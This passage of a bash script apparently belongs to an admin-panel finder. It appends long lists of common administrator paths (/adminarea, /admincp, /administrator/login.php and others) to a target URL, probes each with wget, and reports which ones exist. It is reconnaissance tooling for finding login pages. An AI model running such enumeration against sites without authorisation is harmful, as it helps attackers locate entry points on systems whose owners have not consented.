c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/admin3"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin4"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin4_account"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin4_colon"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin5"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminarea/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincontrol/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admincp/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administer"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administr8"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administr8.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administr8.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administr8.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administracao"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratie"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administration"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administration.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administration.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administration.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/administrator.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/account.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrator/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratoraccounts"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administratorlogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrators"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrators.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/administrators.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/administrivia"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminitem.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
